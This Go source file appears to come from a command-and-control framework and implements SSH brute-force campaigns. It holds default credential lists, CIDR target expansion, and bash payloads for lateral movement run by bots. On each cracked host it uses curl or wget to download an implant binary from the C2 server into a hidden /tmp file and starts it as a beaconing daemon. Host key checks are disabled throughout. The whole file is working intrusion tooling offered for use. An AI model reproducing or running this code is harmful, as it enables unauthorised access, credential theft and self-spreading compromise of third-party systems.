package engine

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/shardc2/shardc2/internal/database"
	"golang.org/x/crypto/ssh"
)

type bruteConfig struct {
	Mode       string   `json:"mode"`
	Targets    []string `json:"targets"`
	Ports      []int    `json:"ports"`
	Usernames  []string `json:"usernames"`
	Passwords  []string `json:"passwords"`
	UseDBCreds bool     `json:"use_db_creds"`
	Workers    int      `json:"workers"`
}

func populateBruteDefaults(cfg *bruteConfig, db *database.DB) {
	if len(cfg.Ports) == 0 {
		cfg.Ports = []int{22}
	}
	if len(cfg.Usernames) == 0 {
		cfg.Usernames = []string{"root", "admin", "ubuntu", "ec2-user", "deploy", "git", "postgres", "mysql"}
	}
	if len(cfg.Passwords) == 0 {
		cfg.Passwords = []string{"password", "admin", "root", "toor", "123456", "admin123", "P@ssw0rd", "changeme", "letmein"}
	}
	if cfg.Workers <= 0 {
		cfg.Workers = 10
	}

	if cfg.UseDBCreds {
		rows, err := db.Query(`SELECT DISTINCT username, password FROM credentials WHERE valid = true`)
		if err == nil {
			defer rows.Close()
			for rows.Next() {
				var u, p string
				if rows.Scan(&u, &p) == nil {
					cfg.Usernames = appendUnique(cfg.Usernames, u)
					cfg.Passwords = appendUnique(cfg.Passwords, p)
				}
			}
		}
	}
}

// BruteTasks generates shell commands for bot-based lateral movement brute forcing.
func BruteTasks(db *database.DB, config string, botIDs []string) ([]TaskTemplate, bool) {
	var cfg bruteConfig
	if err := json.Unmarshal([]byte(config), &cfg); err != nil {
		log.Printf("[-] Brute: invalid config: %v", err)
		return nil, false
	}
	populateBruteDefaults(&cfg, db)

	var allTargets []string
	for _, t := range cfg.Targets {
		allTargets = append(allTargets, expandTarget(t)...)
	}
	if len(allTargets) == 0 {
		log.Printf("[-] Brute campaign (lateral): no valid targets")
		return nil, false
	}

	userList := shellQuoteList(cfg.Usernames)
	passList := shellQuoteList(cfg.Passwords)

	var tasks []TaskTemplate
	for i, target := range allTargets {
		botID := botIDs[i%len(botIDs)]
		for _, port := range cfg.Ports {
			payload := generateBrutePayload(target, port, userList, passList)
			tasks = append(tasks, TaskTemplate{
				Name:    fmt.Sprintf("Brute %s:%d", target, port),
				CmdType: "shell",
				Payload: payload,
				BotID:   botID,
			})
		}
	}
	return tasks, true
}

// RunExternalBrute runs SSH brute force server-side for external/global targets.
// Runs in a goroutine, writes results directly to DB and triggers auto-deploy.
func (e *Engine) RunExternalBrute(campID, config string) {
	var cfg bruteConfig
	if err := json.Unmarshal([]byte(config), &cfg); err != nil {
		log.Printf("[-] Campaign %s: invalid external brute config: %v", campID[:8], err)
		e.db.Exec(`UPDATE campaigns SET status = 'failed', updated_at = NOW() WHERE id = $1`, campID)
		return
	}
	populateBruteDefaults(&cfg, e.db)

	var allTargets []string
	for _, t := range cfg.Targets {
		allTargets = append(allTargets, expandTarget(t)...)
	}
	if len(allTargets) == 0 {
		log.Printf("[-] Brute campaign %s (external): no valid targets", campID[:8])
		e.db.Exec(`UPDATE campaigns SET status = 'failed', updated_at = NOW() WHERE id = $1`, campID)
		return
	}

	type bruteJob struct {
		target   string
		port     int
		username string
		password string
	}

	totalJobs := len(allTargets) * len(cfg.Ports) * len(cfg.Usernames) * len(cfg.Passwords)
	e.db.Exec(`UPDATE campaigns SET total_tasks = $1, updated_at = NOW() WHERE id = $2`, len(allTargets)*len(cfg.Ports), campID)

	log.Printf("[+] Campaign %s: external brute starting — %d targets, %d ports, %d users, %d passes = %d attempts (%d workers)",
		campID[:8], len(allTargets), len(cfg.Ports), len(cfg.Usernames), len(cfg.Passwords), totalJobs, cfg.Workers)

	jobs := make(chan bruteJob, cfg.Workers*2)
	var wg sync.WaitGroup
	var attempts atomic.Int64
	var found atomic.Int64
	crackedTargets := &sync.Map{}

	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				attempts.Add(1)
				if _, alreadyCracked := crackedTargets.Load(fmt.Sprintf("%s:%d", j.target, j.port)); alreadyCracked {
					continue
				}
				if trySSH(j.target, j.port, j.username, j.password, 5*time.Second) {
					found.Add(1)
					key := fmt.Sprintf("%s:%d", j.target, j.port)
					crackedTargets.Store(key, true)

					log.Printf("[+] Campaign %s: CRACKED %s@%s:%d", campID[:8], j.username, j.target, j.port)

					e.db.Exec(`
						INSERT INTO credentials (username, password, target, port, service, valid)
						VALUES ($1, $2, $3, $4, 'ssh', true)
						ON CONFLICT DO NOTHING`,
						j.username, j.password, j.target, j.port)

					taskOutput := fmt.Sprintf("CRED_FOUND:%s:%s:%s:%d\nExternal brute — cracked via server-side SSH", j.username, j.password, j.target, j.port)
					_, terr := e.db.Exec(`
						INSERT INTO campaign_tasks (campaign_id, bot_id, task_name, status, output, completed_at)
						VALUES ($1, NULL, $2, 'completed', $3, NOW())`,
						campID, fmt.Sprintf("Brute %s:%d", j.target, j.port), taskOutput)
					if terr != nil {
						log.Printf("[-] Campaign %s: failed to insert task: %v", campID[:8], terr)
					}

					go e.deployFromServer(campID, j.username, j.password, j.target, j.port)
				}
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				a := attempts.Load()
				if a >= int64(totalJobs) {
					return
				}
				pct := float64(a) / float64(totalJobs) * 100
				log.Printf("[*] Campaign %s: external brute %d/%d (%.1f%%) — %d found", campID[:8], a, totalJobs, pct, found.Load())
			}
		}
	}()

	go func() {
		defer close(jobs)
		for _, target := range allTargets {
			for _, port := range cfg.Ports {
				for _, user := range cfg.Usernames {
					for _, pass := range cfg.Passwords {
						jobs <- bruteJob{target: target, port: port, username: user, password: pass}
					}
				}
			}
		}
	}()

	wg.Wait()

	totalTargetPorts := len(allTargets) * len(cfg.Ports)
	var completedCount int
	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1 AND status = 'completed'`, campID).Scan(&completedCount)

	remaining := totalTargetPorts - completedCount
	for i := 0; i < remaining; i++ {
		_, rerr := e.db.Exec(`
			INSERT INTO campaign_tasks (campaign_id, bot_id, task_name, status, output, completed_at)
			VALUES ($1, NULL, 'External Brute (no creds found)', 'completed', 'NO_CREDS_FOUND', NOW())`,
			campID)
		if rerr != nil {
			log.Printf("[-] Campaign %s: failed to insert no-creds task: %v", campID[:8], rerr)
		}
	}

	e.db.Exec(`UPDATE campaigns SET completed_tasks = $1, total_tasks = $1, status = 'completed', updated_at = NOW() WHERE id = $2`,
		totalTargetPorts, campID)

	log.Printf("[+] Campaign %s: external brute complete — %d attempts, %d cracked", campID[:8], attempts.Load(), found.Load())
}

// deployFromServer deploys the agent to a cracked target directly from the C2 server via SSH.
func (e *Engine) deployFromServer(campID, user, pass, target string, port int) {
	if e.c2URL == "" || e.implantKey == "" {
		log.Printf("[-] Server-side deploy skipped: c2_url or implant_key not configured")
		return
	}

	sshCfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	addr := fmt.Sprintf("%s:%d", target, port)
	conn, err := ssh.Dial("tcp", addr, sshCfg)
	if err != nil {
		log.Printf("[-] Deploy to %s failed (connect): %v", addr, err)
		return
	}
	defer conn.Close()

	archSession, err := conn.NewSession()
	if err != nil {
		log.Printf("[-] Deploy to %s failed (arch detect): %v", addr, err)
		return
	}
	archOut, _ := archSession.CombinedOutput("uname -m")
	archSession.Close()
	arch := strings.TrimSpace(string(archOut))
	log.Printf("[*] Deploy to %s: detected arch %s", addr, arch)

	rname := fmt.Sprintf("/tmp/.%x", time.Now().UnixNano()%0xFFFFFF)

	downloadCmd := fmt.Sprintf(
		`curl -sk -H 'X-Implant-Key: %s' -o %s '%s/api/v1/agent/binary?arch=%s' 2>/dev/null || wget -q --no-check-certificate --header='X-Implant-Key: %s' -O %s '%s/api/v1/agent/binary?arch=%s' 2>/dev/null`,
		e.implantKey, rname, e.c2URL, arch, e.implantKey, rname, e.c2URL, arch)
	startCmd := fmt.Sprintf(
		"chmod +x %s && nohup %s --server '%s' --implant-key '%s' --interval 10s --jitter 2s --insecure-tls-for-lab-only --daemon >/dev/null 2>&1 & echo $!",
		rname, rname, e.c2URL, e.implantKey)

	session, err := conn.NewSession()
	if err != nil {
		log.Printf("[-] Deploy to %s failed (session): %v", addr, err)
		return
	}
	out, _ := session.CombinedOutput(downloadCmd + " && " + startCmd)
	session.Close()

	log.Printf("[+] Campaign %s: deployed to %s@%s:%d — %s", campID[:8], user, target, port, strings.TrimSpace(string(out)))

	e.db.Exec(`
		INSERT INTO campaign_tasks (campaign_id, bot_id, task_name, status, output, completed_at)
		VALUES ($1, NULL, $2, 'completed', $3, NOW())`,
		campID,
		fmt.Sprintf("Auto-Deploy to %s@%s:%d", user, target, port),
		fmt.Sprintf("DEPLOYED:%s@%s:%d:%s\n%s", user, target, port, rname, string(out)))

	e.db.Exec(`UPDATE campaigns SET total_tasks = total_tasks + 1, completed_tasks = completed_tasks + 1, updated_at = NOW() WHERE id = $1`, campID)
}

func trySSH(target string, port int, username, password string, timeout time.Duration) bool {
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}
	addr := net.JoinHostPort(target, fmt.Sprintf("%d", port))
	conn, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func generateBrutePayload(target string, port int, userList, passList string) string {
	return fmt.Sprintf(`T="%s"; P=%d; USERS=(%s); PASSES=(%s)
FOUND=0
if command -v sshpass &>/dev/null; then
  for U in "${USERS[@]}"; do
    for PW in "${PASSES[@]}"; do
      sshpass -p "$PW" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no -p $P "$U@$T" 'echo SUCCESS' 2>/dev/null
      if [ $? -eq 0 ]; then
        echo "CRED_FOUND:$U:$PW:$T:$P"
        FOUND=1
        break 2
      fi
    done
  done
else
  for U in "${USERS[@]}"; do
    for PW in "${PASSES[@]}"; do
      timeout 5 bash -c "echo '$PW' | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $P $U@$T 'echo SUCCESS'" 2>/dev/null
      if [ $? -eq 0 ]; then
        echo "CRED_FOUND:$U:$PW:$T:$P"
        FOUND=1
        break 2
      fi
    done
  done
fi
if [ $FOUND -eq 0 ]; then echo "NO_CREDS_FOUND:$T:$P"; fi`,
		target, port, userList, passList)
}

func expandTarget(target string) []string {
	target = strings.TrimSpace(target)
	if !strings.Contains(target, "/") {
		if net.ParseIP(target) != nil {
			return []string{target}
		}
		// Try resolving hostname
		ips, err := net.LookupHost(target)
		if err == nil && len(ips) > 0 {
			return ips
		}
		return nil
	}

	ip, ipnet, err := net.ParseCIDR(target)
	if err != nil {
		return nil
	}

	ones, bits := ipnet.Mask.Size()
	if bits-ones > 10 {
		log.Printf("[!] Brute: CIDR %s too large (max /22), trimming", target)
		ones = bits - 10
		ipnet.Mask = net.CIDRMask(ones, bits)
		ipnet.IP = ip.Mask(ipnet.Mask)
	}

	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		ips = append(ips, ip.String())
	}
	if len(ips) > 2 {
		ips = ips[1 : len(ips)-1]
	}
	return ips
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func shellQuoteList(items []string) string {
	quoted := make([]string, len(items))
	for i, item := range items {
		quoted[i] = fmt.Sprintf("%q", item)
	}
	return strings.Join(quoted, " ")
}

func appendUnique(slice []string, item string) []string {
	for _, s := range slice {
		if s == item {
			return slice
		}
	}
	return append(slice, item)
}
